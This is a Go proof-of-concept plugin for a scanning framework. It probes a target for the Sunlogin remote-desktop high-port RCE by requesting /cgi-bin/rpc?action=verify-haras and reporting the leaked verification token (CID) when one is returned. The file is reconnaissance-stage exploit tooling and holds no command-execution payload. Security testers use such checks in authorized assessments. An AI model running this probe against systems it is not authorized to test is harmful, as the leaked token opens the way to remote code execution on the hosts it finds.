package poc_product2

import (
	"encoding/json"
	"github.com/lz520520/railgunlib/pkg/register/poc_register"
	"github.com/lz520520/railgunlib/pkg/templates/poc_model"
	"github.com/lz520520/railgunlib/pkg/templates/poc_templates"
)

type Poc_SunloginRCE struct {
	poc_templates.PocTemplate
}

type jsonResult struct {
	Code_        int    `json:"__code"`
	Enabled      string `json:"enabled"`
	VerifyString string `json:"verify_string"`
	Code         int    `json:"code"`
}

func (self *Poc_SunloginRCE) Poc1() (pocResult poc_model.PocPerPayloadResult) {
	// 默认配置
	pocResult.Status = false
	headers := self.GetInitPocHeaders()
	resp := self.HttpGet(self.AddUri(self.Params.Target, "/cgi-bin/rpc?action=verify-haras"), headers)
	if resp.Err != nil {
		return
	}
	jr := new(jsonResult)
	err := json.Unmarshal([]byte(resp.Body), jr)
	if err != nil {
		pocResult.Err = err
		return
	}
	if jr.VerifyString != "" {
		pocResult.Status = true
		pocResult.Messages = "CID=" + jr.VerifyString
	}
	//"{\"success\":false,\"msg\":\"Verification failure\"}"

	return
}

func init() {
	registerMsg := poc_register.PocRegisterMsg{Msg: poc_model.PocMsg{
		Author:   "lz520520",
		Time:     "2022-02-16",
		Range:    "",
		ID:       "",
		Describe: "向日葵高端口RCE",
	},
		Proto: poc_model.PocHTTP,
	}
	poc_register.PocStructRegister(&Poc_SunloginRCE{}, registerMsg)
}
